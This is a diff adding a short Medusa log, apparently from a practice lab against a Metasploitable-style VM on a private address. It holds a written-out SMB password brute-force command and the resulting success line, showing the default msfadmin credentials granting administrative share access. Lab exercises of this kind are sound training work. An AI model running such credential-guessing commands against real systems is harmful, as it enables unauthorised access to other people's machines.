@@ -1,0 +1,5 @@
+# Medusa v.2.3 (2026-11-08 07:38:43)
+# medusa -h 192.168.56.101 -U /home/kali/projeto-medusa/wordlists/usuarios-smb.txt -p msfadmin -M smbnt -t 1 -O /home/kali/projeto-medusa/resultado-smb.txt 
+2026-11-08 07:38:43 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+# Medusa has finished (2026-11-08 07:38:43).
+                                                
